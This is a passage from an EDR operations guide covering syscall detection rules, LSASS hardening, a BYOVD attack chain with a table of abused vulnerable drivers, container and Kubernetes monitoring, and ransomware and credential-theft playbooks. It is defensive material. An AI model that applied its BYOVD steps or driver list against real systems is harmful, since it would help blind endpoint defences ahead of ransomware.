### 10.9 Building Detection for Direct Syscalls

Advanced detection for techniques that bypass userland hooks:

```xml
<!-- Wazuh rule for detecting potential direct syscall usage -->
<!-- Requires Windows Defender ETW or kernel telemetry -->

<rule id="100110" level="12">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.callTrace" type="pcre2">(?i)UNKNOWN|\\device\\</field>
  <field name="win.eventdata.callTrace" negate="yes" type="pcre2">ntdll\.dll</field>
  <description>HIGH: System call from non-ntdll memory - possible direct syscall evasion (T1106)</description>
  <mitre>
    <id>T1106</id>
  </mitre>
  <group>defense_evasion,attack,</group>
</rule>
```

**Kernel-level detection with Windows Defender Exploit Guard:**

```powershell
# Enable Exploit Protection for specific processes to detect injection
Set-ProcessMitigation -Name "lsass.exe" -Enable DisallowChildProcessCreation
Set-ProcessMitigation -Name "lsass.exe" -Enable AuditDynamicCode
Set-ProcessMitigation -Name "lsass.exe" -Enable CFG  # Control Flow Guard

# Enable Credential Guard (blocks LSASS credential extraction entirely)
# This renders direct syscall attacks against LSASS moot
reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
```

### 10.10 Continuous Detection Improvement Cycle

```
┌─────────────────────────────────────────────────────────┐
│         DETECTION ENGINEERING LIFECYCLE                   │
│                                                           │
│   ┌───────────────┐                                      │
│   │ 1. Threat     │  Identify new adversary techniques   │
│   │    Intel      │  from CTI feeds, incidents, research │
│   └───────┬───────┘                                      │
│           │                                               │
│           ▼                                               │
│   ┌───────────────┐                                      │
│   │ 2. Gap        │  Map technique to current coverage   │
│   │    Analysis   │  Identify detection blind spots      │
│   └───────┬───────┘                                      │
│           │                                               │
│           ▼                                               │
│   ┌───────────────┐                                      │
│   │ 3. Rule       │  Write Sigma/YARA/custom rules       │
│   │    Development│  Define behavioral patterns          │
│   └───────┬───────┘                                      │
│           │                                               │
│           ▼                                               │
│   ┌───────────────┐                                      │
│   │ 4. Testing    │  Atomic Red Team validation          │
│   │    (Purple)   │  Verify detection fires correctly    │
│   └───────┬───────┘                                      │
│           │                                               │
│           ▼                                               │
│   ┌───────────────┐                                      │
│   │ 5. Tuning     │  Reduce false positives              │
│   │               │  Adjust thresholds                   │
│   └───────┬───────┘                                      │
│           │                                               │
│           ▼                                               │
│   ┌───────────────┐                                      │
│   │ 6. Deploy     │  Push to production EDR/SIEM         │
│   │               │  Monitor alert quality               │
│   └───────┬───────┘                                      │
│           │                                               │
│           └──────────────────── Loop back to 1 ──────────│
└─────────────────────────────────────────────────────────┘
```

---

## 11. MDR: Managed Detection and Response

### 11.1 Definizione e Modello Operativo

Managed Detection and Response (MDR) is a service model where a third-party provider operates detection and response capabilities on behalf of the customer. Unlike EDR (a technology) or XDR (an architecture), MDR is a staffing and operational model — the customer deploys EDR/XDR tooling, but a dedicated external SOC team monitors alerts, investigates incidents, and executes response actions 24/7/365.

**Core MDR service components:**

| Component | Description |
|-----------|-------------|
| 24/7 Monitoring | Continuous human analyst coverage across all time zones |
| Alert Triage | Analysts classify, prioritize, and investigate alerts before escalating |
| Threat Hunting | Proactive hypothesis-driven searches through customer telemetry |
| Incident Response | Containment and remediation actions executed by the MDR team |
| Reporting | Regular reports on threat landscape, detections, and recommendations |
| Onboarding | Sensor deployment, policy tuning, baseline establishment |

**MDR delivery models:**

- **Full MDR**: The provider owns the entire detection-to-response lifecycle, including endpoint isolation, malware removal, and forensic investigation. The customer receives notifications of completed actions.
- **Co-managed MDR**: Shared responsibility — the MDR provider triages and escalates, but the customer's internal team makes containment decisions and executes response.
- **MDR with BYOT (Bring Your Own Technology)**: The provider overlays their analysts and processes on the customer's existing EDR/SIEM stack rather than requiring a specific vendor's tooling.

### 11.2 EDR vs MDR vs XDR: Confronto Sistematico

| Dimension | EDR | XDR | MDR |
|-----------|-----|-----|-----|
| **Type** | Technology/Product | Technology/Architecture | Service |
| **Scope** | Endpoints only | Endpoints + network + email + cloud + identity | Depends on underlying technology |
| **Staffing** | Requires in-house SOC team | Requires in-house SOC team | External analysts included |
| **Detection** | Endpoint behavioral analytics | Cross-domain correlation | Human + automated analysis |
| **Response** | Automated + manual on endpoints | Automated across all domains | Human-driven response |
| **Cost model** | License per endpoint | License per endpoint + data sources | Monthly per-endpoint subscription |
| **Best for** | Orgs with mature SOC teams | Enterprises with complex environments | Orgs lacking 24/7 security staff |
| **Typical MTTD** | Minutes (automated) | Minutes (cross-correlated) | 15-60 minutes (human-in-loop) |

**When to choose MDR over in-house EDR operations:**

1. **Staffing constraints**: The global cybersecurity workforce gap exceeded 4 million positions in 2025. Organizations that cannot recruit and retain SOC analysts benefit from MDR's shared staffing model.
2. **24/7 coverage requirements**: Running a three-shift SOC internally requires a minimum of 8-12 analysts. MDR amortizes this cost across hundreds of customers.
3. **Speed to maturity**: An MDR engagement can reach operational effectiveness within weeks, versus months or years to build an internal SOC from scratch.
4. **Regulatory compliance**: Sectors like healthcare (HIPAA), finance (PCI DSS), and government (CMMC) increasingly require demonstrated 24/7 monitoring capabilities.

### 11.3 Principali Fornitori MDR

**CrowdStrike Falcon Complete** — Full-cycle MDR built on the Falcon platform. CrowdStrike analysts operate directly within the customer's Falcon tenant, executing containment and remediation with a published median response time of under 10 minutes from detection to containment.

**Arctic Wolf** — Vendor-agnostic MDR that ingests telemetry from the customer's existing security stack (any EDR, firewall, cloud logs). Their Concierge Security Team model assigns a named team to each customer for continuity.

**Sophos MDR** — Integrates with both Sophos and third-party security products. Offers three response tiers: Notify (alert only), Collaborate (joint decision-making), and Authorize (full autonomous response).

**Red Canary** — Originally built on Carbon Black telemetry, now multi-platform. Known for detection engineering depth and public Atomic Red Team framework contributions. Publishes annual Threat Detection Reports with detection analytics.

**Expel** — Emphasizes transparency through their Workbench platform, giving customers full visibility into analyst investigation workflows and decision trees. Focuses on actionable remediation guidance.

---

## 12. BYOVD e Attacchi al Kernel EDR

### 12.1 Anatomia di un Attacco BYOVD

Bring Your Own Vulnerable Driver (BYOVD) is the most impactful EDR evasion technique to emerge in 2024-2026. The attack exploits a fundamental trust model weakness: Windows allows any legitimately signed kernel driver to load and execute with Ring 0 privileges, even if the driver contains known vulnerabilities.

**Attack chain:**

```
1. Attacker gains admin access on target endpoint
      │
      ▼
2. Drops a legitimately signed but vulnerable kernel driver
   (e.g., RTCore64.sys, gdrv.sys, procexp.sys)
      │
      ▼
3. Loads the driver via sc.exe or direct NtLoadDriver syscall
   Windows allows it — driver signature is valid
      │
      ▼
4. Exploits vulnerability in the loaded driver to gain
   arbitrary kernel read/write primitive
      │
      ▼
5. Uses kernel access to:
   ├── Enumerate PsSetCreateProcessNotifyRoutine callbacks
   ├── Zero out EDR callback entries
   ├── Terminate EDR processes (bypassing PPL)
   ├── Unload EDR minifilter driver
   └── Remove ETW provider registrations
      │
      ▼
6. EDR is now blind — deploy ransomware/exfiltrate data
```

### 12.2 Driver Vulnerabili Comunemente Sfruttati

| Driver | CVE | Abused By | Capability |
|--------|-----|-----------|------------|
| RTCore64.sys (MSI Afterburner) | CVE-2019-16098 | BlackByte, AvosLocker | Arbitrary kernel R/W |
| gdrv.sys (GIGABYTE) | CVE-2018-19320 | RobbinHood, Cuba | Physical memory R/W |
| mhyprot2.sys (Genshin Impact) | — | Multiple ransomware | Process termination from kernel |
| procexp.sys (Process Explorer) | — | Medusa Locker | Signed by Microsoft, trusted implicitly |
| dbutil_2_3.sys (Dell BIOS) | CVE-2021-21551 | LazarusGroup | Arbitrary kernel R/W |
| ene.sys (ENE Technology) | CVE-2020-12446 | BlackCat/ALPHV | I/O port access |
| NsecSoft driver | CVE-2025-68947 | Reynolds ransomware (2026) | EDR process termination |
| TrueSight driver | — | 2,500+ variants (2024-2025 campaign) | EDR killing at scale |

**2025-2026 escalation**: A single BYOVD campaign using the TrueSight driver deployed over 2,500 unique driver variants between mid-2024 and early 2025, making hash-based blocklisting impractical. The Reynolds ransomware family (February 2026) embedded a vulnerable NsecSoft driver directly within the ransomware payload, eliminating the separate "EDR-killer" deployment step. This represents a shift from BYOVD as a specialized technique to BYOVD as a standard pre-encryption phase in ransomware operations.

### 12.3 Difese Contro BYOVD

**Microsoft Vulnerable Driver Blocklist (WDBL):**

Microsoft maintains a blocklist of known-vulnerable drivers enforced by HVCI (Hypervisor-Protected Code Integrity). When enabled, Windows refuses to load drivers on the blocklist regardless of their signature status.

```powershell
# Verify HVCI and driver blocklist status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object VirtualizationBasedSecurityStatus,
                  CodeIntegrityPolicyEnforcementStatus

# Check if the Vulnerable Driver Blocklist is active
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config" -Name VulnerableDriverBlocklistEnable

# Force update of the blocklist via Windows Update
# The blocklist is updated as part of regular Windows quality updates
```

**Layered defense strategy:**

1. **HVCI enforcement**: Prevents unsigned and blocklisted drivers from loading
2. **WDAC (Windows Defender Application Control)**: Policy-based driver allowlisting — only pre-approved drivers can load
3. **EDR self-monitoring**: Modern EDR agents verify their own kernel callback registrations periodically; if callbacks are removed, they re-register and alert
4. **Driver load monitoring**: Alert on any driver load event from non-standard paths or involving known-vulnerable driver hashes
5. **Secure Boot + measured boot**: Ensures the boot chain integrity and detects tampering with early-load drivers
6. **Admin privilege reduction**: BYOVD requires administrator access to load drivers — limiting admin rights eliminates the attack surface entirely

---

## 13. EDR per Workload Cloud e Container

### 13.1 Container Runtime Security

Traditional EDR agents designed for persistent OS installations face architectural challenges in containerized environments where workloads are ephemeral, immutable, and share host kernels.

**eBPF-based container monitoring:**

Modern cloud-native EDR solutions use eBPF (Extended Berkeley Packet Filter) to monitor container activity from the host kernel without requiring an agent inside each container:

```
┌────────────────────────────────────────────────────────┐
│                    KUBERNETES NODE                       │
│                                                          │
│  ┌────────────────────────────────────────────────┐    │
│  │              Host Kernel                         │    │
│  │  ┌──────────────────────────────────────────┐   │    │
│  │  │    eBPF Programs (attached to syscalls)   │   │    │
│  │  │    ├── sys_enter_execve                   │   │    │
│  │  │    ├── sys_enter_connect                  │   │    │
│  │  │    ├── sys_enter_open                     │   │    │
│  │  │    ├── security_file_open                 │   │    │
│  │  │    └── security_bprm_check               │   │    │
│  │  └──────────────────┬───────────────────────┘   │    │
│  │                     │ events                      │    │
│  │                     ▼                             │    │
│  │  ┌──────────────────────────────────────────┐   │    │
│  │  │    EDR Agent (DaemonSet pod)              │   │    │
│  │  │    ├── Policy Engine                      │   │    │
│  │  │    ├── Container Context Enrichment       │   │    │
│  │  │    │   (pod name, namespace, image, labels)│  │    │
│  │  │    └── Telemetry Forwarding               │   │    │
│  │  └──────────────────────────────────────────┘   │    │
│  └────────────────────────────────────────────────┘    │
│                                                          │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │
│  │Container │ │Container │ │Container │ │Container │ │
│  │  App A   │ │  App B   │ │  App C   │ │  App D   │ │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘ │
└────────────────────────────────────────────────────────┘
```

**Key container-specific detection scenarios:**

| Threat | Detection Method | EDR Indicator |
|--------|-----------------|---------------|
| Container escape | `nsenter` or `unshare` syscalls from container context | Process execution crossing namespace boundaries |
| Cryptominer deployment | CPU usage anomaly + connection to mining pools | Network connection to known mining pool IPs/domains |
| Supply chain compromise | Unexpected binary execution in container | Process not present in original container image |
| Privilege escalation | Container runs as root, mounts host paths | Sensitive host path access from container namespace |
| Reverse shell | `/bin/sh` or `/bin/bash` with network redirect | Shell process spawned with stdin/stdout to socket |

### 13.2 Kubernetes Audit Log Integration

EDR platforms extend into the Kubernetes control plane by ingesting audit logs that capture all API server interactions:

```yaml
# Kubernetes audit policy for EDR integration
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log all pod exec/attach (potential container breakout)
  - level: RequestResponse
    verbs: ["create"]
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach"]
    
  # Log all secret access (credential theft)
  - level: Metadata
    verbs: ["get", "list", "watch"]
    resources:
      - group: ""
        resources: ["secrets"]
  
  # Log all service account token requests
  - level: Metadata
    verbs: ["create"]
    resources:
      - group: ""
        resources: ["serviceaccounts/token"]
  
  # Log RBAC changes (privilege escalation)
  - level: RequestResponse
    verbs: ["create", "update", "patch", "delete"]
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]
```

### 13.3 Serverless e FaaS Monitoring

Serverless environments (AWS Lambda, Azure Functions, GCP Cloud Functions) present a unique challenge: there is no persistent endpoint to install an agent on. EDR visibility comes from:

- **Runtime instrumentation**: Language-specific wrappers that intercept function invocations, outbound network calls, and file system access within the function execution environment
- **Cloud API audit logs**: CloudTrail (AWS), Activity Log (Azure), Cloud Audit Logs (GCP) capture function invocations, permission changes, and configuration modifications
- **Network flow logs**: VPC Flow Logs capture network connections from serverless execution environments
- **Image scanning**: Pre-deployment scanning of container images and function packages for known vulnerabilities, embedded secrets, and malicious dependencies

---

## 14. AI e GenAI nell'EDR Moderno

### 14.1 Modelli ML Tradizionali nell'EDR

Machine learning has been integral to EDR since approximately 2016, but the model architectures and training methodologies have evolved substantially:

**Static file classification models** analyze PE structure, section characteristics, entropy, import tables, and string features to classify files before execution. These models (typically gradient-boosted decision trees like XGBoost or LightGBM) achieve false positive rates below 0.1% while detecting 95%+ of known malware families. They serve as the first-pass filter before behavioral analysis.

**Behavioral sequence models** use temporal analysis of process actions — API call sequences, file operations, registry modifications, network connections — to classify running processes. These recurrent or transformer-based architectures evaluate the ordering and timing of events, detecting malicious patterns even when individual actions are benign in isolation.

**Anomaly detection models** establish per-endpoint behavioral baselines using unsupervised approaches (Isolation Forest, autoencoders, variational autoencoders). Deviations from the baseline — a finance user's workstation suddenly running PowerShell scripts or a server process initiating outbound connections to previously unseen domains — trigger investigations. The challenge is balancing sensitivity (catching novel threats) against alert volume (dynamic environments produce legitimate deviations).

### 14.2 Agentic AI e GenAI nell'EDR (2025-2026)

The integration of generative AI and agentic AI into EDR platforms represents the most significant operational evolution since the introduction of behavioral detection:

**Agentic AI for autonomous investigation:**

Advanced EDR platforms now deploy AI systems capable of not just detecting threats, but reasoning about them, investigating autonomously, and executing remediation actions. This capability addresses the critical cybersecurity skills gap — in a 2025 survey, organizations reported an average of 960 alerts per day, with each full investigation requiring approximately 70 minutes. Agentic AI reduces the per-alert investigation time to seconds for routine incidents.

**Capabilities of GenAI-augmented EDR:**

| Capability | Traditional EDR | GenAI-Enhanced EDR |
|-----------|----------------|-------------------|
| Alert explanation | Technical fields, IOC lists | Natural language narrative of the attack |
| Investigation guidance | Static playbooks | Dynamic reasoning based on context |
| Query generation | Manual KQL/EQL/SPL writing | Natural language to query translation |
| Report generation | Template-based exports | Contextual incident narratives |
| Threat hunting | Hypothesis requires expert knowledge | AI-suggested hypotheses from telemetry patterns |
| Remediation | Pre-defined automated actions | Context-aware response recommendations |

**Natural language querying example:**

```
Analyst input:  "Show me all processes that contacted external IPs
                 after being spawned by Office applications this week"

GenAI translation to KQL:
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessParentFileName in~
    ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe")
| join kind=inner (
    DeviceNetworkEvents
    | where Timestamp > ago(7d)
    | where RemoteIPType == "Public"
) on DeviceId, $left.ProcessId == $right.InitiatingProcessId
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          RemoteIP, RemotePort, RemoteUrl
| sort by Timestamp desc
```

### 14.3 Rischi e Limitazioni dell'AI nell'EDR

AI-driven EDR introduces new risk vectors that security teams must account for:

- **Adversarial ML attacks**: Attackers craft payloads specifically designed to evade ML classifiers — adding benign-looking PE sections, mimicking legitimate process behavior sequences, or introducing noise into command-line features
- **Model poisoning**: If an attacker can influence the training data (e.g., by generating large volumes of benign-looking malicious activity during the baseline learning period), they can shift the model's decision boundary
- **Hallucination in GenAI components**: LLM-generated investigation guidance or query translations may contain plausible but incorrect logic, leading analysts down false paths
- **Over-reliance on automation**: Autonomous response actions executed by AI without human oversight risk false-positive containment of legitimate business processes

---

## 15. Valutazioni MITRE ATT&CK e Selezione EDR

### 15.1 Struttura delle Valutazioni MITRE Engenuity

MITRE Engenuity conducts annual ATT&CK Evaluations where participating EDR vendors defend against real-world adversary emulations. These evaluations are the most rigorous public benchmarks for EDR detection capabilities.

**2025 Enterprise Evaluation (Round 7):**

- **Participants**: 11 vendors — Acronis, AhnLab, CrowdStrike, Cyberani, Cybereason, Cynet, ESET, Sophos, Trend Micro, WatchGuard, WithSecure
- **Notable absences**: Microsoft, Palo Alto Networks, and SentinelOne withdrew, citing the resource-intensive commitment required
- **Adversary emulations**: Two scenarios comprising 16 steps and 90 sub-steps total
  - **Demeter (Scattered Spider)**: High-tempo adversary known for social engineering, the first MITRE evaluation to include cloud infrastructure attacks
  - **Hermes (Mustang Panda)**: State-sponsored cyberespionage group with rapidly evolving capabilities
- **New in 2025**: First inclusion of cloud infrastructure attack scenarios and adversary reconnaissance detection testing

**2026 Enterprise Evaluation (Round 8):**

MITRE introduced the Total Evaluation Score (TES) framework, a significant methodology evolution. TES provides a standardized scoring system with enhanced transparency, allowing more objective comparison between vendors. Key changes include:

- Standardized scoring rubric replacing the previous qualitative detection categories
- Enhanced transparency in detection classification methodology
- Improved scenario design reflecting current threat landscape

### 15.2 Interpretazione dei Risultati

MITRE does not rank vendors or declare winners. Results must be interpreted contextually:

**Detection categories (pre-2026 methodology):**

| Category | Meaning | Value |
|----------|---------|-------|
| Analytic | Detection via data processing (correlation rule, behavioral logic, ML model) | Highest — demonstrates real detection capability |
| Telemetry | Raw event recorded but no detection fired | Valuable for hunting, insufficient for automated detection |
| None | Sub-step not detected and no telemetry recorded | Gap in visibility |

**Critical evaluation criteria when selecting an EDR:**

1. **Analytic coverage breadth**: What percentage of sub-steps generated analytic detections (not just telemetry)?
2. **Detection latency**: How quickly after technique execution did the detection fire?
3. **Configuration changes**: Did the vendor require configuration changes during the evaluation (indicating default policies miss detections)?
4. **Delayed detections**: Were detections generated in real-time or only after cloud processing delays?
5. **False positive assessment**: MITRE evaluations do not test false positive rates — this must be assessed separately through PoC deployments
6. **Protection mode performance**: How effectively did the EDR block techniques in prevention mode versus detect-only mode?

### 15.3 Framework di Selezione EDR Enterprise

```yaml
# EDR vendor evaluation scorecard
evaluation_criteria:
  detection_efficacy:
    weight: 30%
    metrics:
      - mitre_analytic_coverage_percentage
      - detection_latency_p95
      - behavioral_vs_signature_ratio
      - false_positive_rate_in_poc
    
  operational_efficiency:
    weight: 25%
    metrics:
      - alert_volume_per_endpoint_per_day
      - investigation_workflow_quality
      - api_completeness_for_automation
      - soar_integration_depth
    
  deployment_and_management:
    weight: 20%
    metrics:
      - agent_resource_footprint_cpu_memory
      - multi_os_support_depth
      - policy_management_granularity
      - update_mechanism_reliability
    
  response_capabilities:
    weight: 15%
    metrics:
      - remote_isolation_speed
      - live_response_feature_set
      - automated_remediation_options
      - rollback_capability
    
  vendor_viability:
    weight: 10%
    metrics:
      - market_position_and_financials
      - threat_intelligence_quality
      - support_and_sla_commitments
      - roadmap_alignment
```

---

## 16. Playbook Operativi di Risposta EDR

### 16.1 Playbook: Risposta Ransomware

```yaml
playbook:
  name: "Ransomware Detection and Containment"
  trigger:
    any_of:
      - "EDR alert: Rapid file encryption pattern detected"
      - "EDR alert: Known ransomware family signature"
      - "EDR alert: MBR/VBR modification detected"
      - "User report: Files inaccessible, ransom note found"
  
  severity: P1 — CRITICAL
  sla: "Containment within 15 minutes of detection"
  
  phase_1_immediate_containment:
    actions:
      - step: "Isolate affected endpoint(s) via EDR"
        command: "EDR API → isolate_host(hostname)"
        timeout: "30 seconds"
        fallback: "Network team disables switch port"
      
      - step: "Kill encryption process tree"
        command: "EDR API → kill_process_tree(pid)"
        
      - step: "Disable compromised user account in AD"
        command: "Disable-ADAccount -Identity $username"
      
      - step: "Block lateral movement"
        detail: "Disable SMB, RDP, WinRM on segment via firewall"
    
  phase_2_scope_assessment:
    actions:
      - step: "Query EDR for all endpoints with same IOCs"
        detail: "Search for ransomware binary hash, C2 domains, 
                 and process execution patterns across fleet"
      
      - step: "Check backup integrity"
        detail: "Verify backup systems are not compromised and 
                 last known-good backup is available"
      
      - step: "Identify initial access vector"
        detail: "Trace process tree backward from encryption 
                 process to initial entry point"
    
  phase_3_eradication:
    actions:
      - step: "Collect forensic evidence"
        detail: "Memory dump, disk image, EDR telemetry export"
      
      - step: "Remove persistence mechanisms"
        detail: "Scheduled tasks, registry run keys, services,
                 WMI subscriptions planted by adversary"
      
      - step: "Patch exploited vulnerability"
        detail: "If initial access was via exploit, patch before
                 restoring connectivity"
    
  phase_4_recovery:
    actions:
      - step: "Restore from clean backup"
      - step: "Re-image affected endpoints if no clean backup"
      - step: "Gradually remove network isolation"
      - step: "Monitor recovered endpoints for 72 hours"
```

### 16.2 Playbook: Rilevamento Lateral Movement

```yaml
playbook:
  name: "Lateral Movement Detection and Response"
  trigger:
    any_of:
      - "EDR alert: PsExec service installation on remote host"
      - "EDR alert: Remote service creation via SCM"
      - "EDR alert: WMI process creation on remote host"
      - "EDR alert: RDP connection from unusual source"
      - "EDR alert: Pass-the-Hash/Pass-the-Ticket detected"
  
  severity: P1 — HIGH
  
  investigation_steps:
    - step: "Identify source and destination endpoints"
      query: "Process tree analysis on both source and target hosts"
    
    - step: "Determine credential used"
      detail: "Check authentication logs — which account moved 
               laterally? Is it a service account, admin, or user?"
    
    - step: "Map the full lateral movement path"
      detail: "Query EDR telemetry for all authentication events 
               from the source host in the past 24 hours — build 
               the complete movement graph"
    
    - step: "Assess each compromised host"
      detail: "For every host touched, check for persistence 
               mechanisms, dropped tools, data access patterns"
  
  response_actions:
    - "Isolate all hosts in the lateral movement chain"
    - "Force password reset for compromised account(s)"
    - "Revoke all active Kerberos tickets (krbtgt reset if 
       Golden Ticket suspected)"
    - "Block source IP at network perimeter"
    - "Enable enhanced monitoring on the segment"
```

### 16.3 Playbook: Credential Theft Detection

```yaml
playbook:
  name: "Credential Access Detection and Response"
  trigger:
    any_of:
      - "EDR alert: LSASS process access from unsigned binary"
      - "EDR alert: Mimikatz signatures in memory"
      - "EDR alert: DCSync replication request from non-DC"
      - "EDR alert: SAM/SYSTEM hive exfiltration"
      - "EDR alert: Kerberoasting SPN enumeration"
  
  severity: P1 — CRITICAL
  
  immediate_actions:
    - step: "Isolate source endpoint"
    - step: "Capture memory dump of source process before kill"
    - step: "Disable compromised user account"
    - step: "Identify scope of credential exposure"
      detail: "Which credentials were accessible?
               - Local admin hashes
               - Domain user NTLM hashes
               - Kerberos TGTs
               - Cached domain credentials
               - Service account credentials"
  
  credential_remediation:
    - "Reset passwords for all potentially exposed accounts"
    - "Rotate service account passwords/keys"
    - "If domain admin compromised: initiate krbtgt double-reset"
    - "Enable Credential Guard on all tier-0 assets"
    - "Review and reduce accounts with DC replication rights"
    - "Deploy LSASS PPL on all endpoints"
```

---

## 17. Metriche e KPI per Operazioni EDR

### 17.1 Metriche Operative Fondamentali

Effective EDR operations require quantitative measurement across detection, response, and operational efficiency dimensions:

| Metric | Definition | Target | Measurement Method |
|--------|-----------|--------|-------------------|
| **MTTD** (Mean Time to Detect) | Average time from adversary action to EDR alert generation | < 5 minutes | Timestamp delta: technique execution → alert creation |
| **MTTR** (Mean Time to Respond) | Average time from alert creation to containment action | < 30 minutes (P1), < 4 hours (P2) | Timestamp delta: alert → isolation/remediation |
| **MTTI** (Mean Time to Investigate) | Average time from alert triage to root cause determination | < 60 minutes (P1) | Analyst time tracking per incident |
| **Detection Coverage Ratio** | Percentage of MITRE ATT&CK techniques with active detections | > 80% of relevant techniques | ATT&CK coverage heatmap analysis |
| **False Positive Rate** | Percentage of alerts that are benign upon investigation | < 20% of total alerts | Monthly FP classification review |
| **Alert-to-Incident Ratio** | Number of raw alerts per confirmed incident | < 50:1 | SIEM correlation metrics |
| **Agent Health** | Percentage of endpoints with healthy, reporting EDR agents | > 99% | EDR console health dashboard |
| **Telemetry Completeness** | Percentage of endpoint events successfully ingested | > 99.5% | Agent telemetry vs. expected event volume |

### 17.2 Dashboard Operativo

```yaml
# EDR operations dashboard structure
dashboard:
  real_time_panels:
    - panel: "Active Critical Alerts"
      source: "EDR API — unresolved alerts with severity >= HIGH"
      refresh: "30 seconds"
    
    - panel: "Isolated Endpoints"
      source: "EDR API — currently isolated hosts"
      refresh: "1 minute"
    
    - panel: "Agent Health Status"
      visualization: "Pie chart — healthy/degraded/offline"
      thresholds:
        healthy: "> 99% (green)"
        warning: "97-99% (yellow)"
        critical: "< 97% (red)"
    
    - panel: "Telemetry Ingestion Rate"
      visualization: "Time series — events per second"
      alert_on: "Drop > 20% from baseline"
  
  daily_metrics_panels:
    - panel: "MTTD Trend (30-day rolling)"
    - panel: "MTTR by Severity"
    - panel: "False Positive Rate (weekly)"
    - panel: "Top 10 Alert Generators (tuning candidates)"
    - panel: "Detection Coverage Delta (new techniques added)"
  
  monthly_review_panels:
    - panel: "ATT&CK Coverage Heatmap"
    - panel: "Incident Type Distribution"
    - panel: "Analyst Workload Distribution"
    - panel: "Exclusion Policy Audit"
    - panel: "EDR Agent Version Compliance"
```

### 17.3 Calcolo del ROI dell'EDR

Quantifying EDR return on investment requires measuring both tangible cost avoidance and operational efficiency gains:

**Cost avoidance model:**

```
Annual EDR ROI =
  (Estimated breach cost avoided × Probability reduction)
  + (Alert handling time saved × Analyst hourly cost)
  + (Compliance penalty avoidance)
  - (EDR licensing + deployment + operational cost)

Example calculation (mid-size enterprise, 5,000 endpoints):
  Breach cost avoided:    $4.45M avg breach cost × 0.60 risk reduction = $2,670,000
  Alert efficiency:       2,000 alerts/month × 40 min saved × $75/hr  = $1,200,000
  Compliance avoidance:   Estimated regulatory penalty risk reduction  = $500,000
  Total benefit:                                                        $4,370,000
  
  EDR cost:               5,000 endpoints × $45/endpoint/year         = $225,000
  Operational cost:       2 FTE analysts dedicated to EDR              = $200,000
  Integration/tuning:     Annual professional services                 = $75,000
  Total cost:                                                           $500,000
  
  Net ROI:  ($4,370,000 - $500,000) / $500,000 = 774%
```

The ROI model above is illustrative — actual values depend on industry vertical, threat landscape, existing security posture, and organizational risk tolerance. The key insight is that EDR cost is dominated by operational expenditure (people and process), not technology licensing.

---

## 18. Strumenti EDR e DFIR Open Source

### 18.1 Velociraptor: Piattaforma DFIR Avanzata

Velociraptor, developed by Rapid7, is an advanced open-source endpoint monitoring, digital forensic, and incident response platform. What distinguishes Velociraptor from traditional EDR or SIEM solutions is its forensic-specific query language — Velociraptor Query Language (VQL).

**Architecture and scaling:**

A single Velociraptor server handles 10,000-15,000 endpoints. For larger deployments, Velociraptor supports multi-frontend architecture scaling to over 100,000 endpoints. It supports Windows, Linux, and macOS.

**VQL artifact example — hunting for persistence mechanisms:**

```sql
-- VQL artifact: Hunt for scheduled task persistence
SELECT Name, ActionPath, ActionArguments, 
       Principal, Triggers, Status
FROM Artifact.Windows.System.TaskScheduler()
WHERE NOT ActionPath =~ "(?i)Microsoft|Windows|System32"
  AND Status = "Ready"
```

```sql
-- VQL artifact: Detect unsigned DLLs in running processes
SELECT Pid, Name, ModuleName, ModulePath, 
       authenticode(filename=ModulePath) AS SigInfo
FROM modules(pid=getpid())
WHERE NOT SigInfo.Trusted = "trusted"
```

**Key Velociraptor capabilities:**

| Capability | Description |
|-----------|-------------|
| **Real-time hunting** | Push VQL queries to thousands of endpoints simultaneously |
| **Artifact library** | 300+ community-contributed collection artifacts |
| **Server-side event monitoring** | Continuous monitoring with server-side VQL queries |
| **File collection** | Bulk collection of forensic artifacts (event logs, prefetch, MFT) |
| **YARA scanning** | Memory and file scanning with YARA rules across fleet |
| **Notebook analysis** | Jupyter-style notebooks for interactive investigation |

### 18.2 LimaCharlie: SecOps Cloud Platform

LimaCharlie originated as an open-source EDR project and evolved into a commercial SecOps Cloud Platform with a generous free tier. It provides infrastructure primitives rather than an opinionated product, allowing security teams and MSSPs to build custom detection and response workflows.

**Key differentiators:**

- **API-first design**: Every capability is accessible via REST API, enabling full automation
- **Multi-platform agent**: Windows, macOS, Linux, Docker, ChromeOS, Chrome, and Edge browser extension
- **Pay-per-use pricing**: No minimum commitments, consumption-based billing
- **Open rule integration**: Native support for Sigma, YARA, and Zeek rule formats
- **One-year free data retention**: Historical telemetry accessible for retroactive hunting
- **YAML-based D&R rules**: Detection and Response rules defined as code, enabling version control and CI/CD for detection engineering

### 18.3 Wazuh: EDR Open Source Enterprise-Grade

Wazuh (covered architecturally in Section 2.6) remains the most widely deployed open-source EDR/HIDS platform. Key 2025-2026 developments include:

- **Wazuh 4.9+**: Enhanced integration with Kubernetes audit logs and container runtime monitoring
- **Vulnerability detection**: Automated CVE scanning correlated with installed package inventory
- **Regulatory compliance**: Built-in mappings for PCI DSS 4.0, HIPAA, GDPR, NIST 800-53, and CIS benchmarks
- **SCA (Security Configuration Assessment)**: Automated checks against CIS hardening benchmarks with remediation guidance
- **Cloud provider integration**: Native modules for AWS CloudTrail, Azure Activity Log, and GCP Cloud Audit Logs

### 18.4 Confronto Strumenti Open Source

| Feature | Velociraptor | LimaCharlie (Free Tier) | Wazuh |
|---------|-------------|------------------------|-------|
| **Primary focus** | DFIR / Threat hunting | SecOps infrastructure | HIDS / Compliance |
| **Agent weight** | Lightweight (single binary) | Lightweight (multi-platform) | Moderate |
| **Query language** | VQL (custom forensic DSL) | D&R YAML rules | Wazuh rules (XML) |
| **Real-time hunting** | Excellent | Good | Limited |
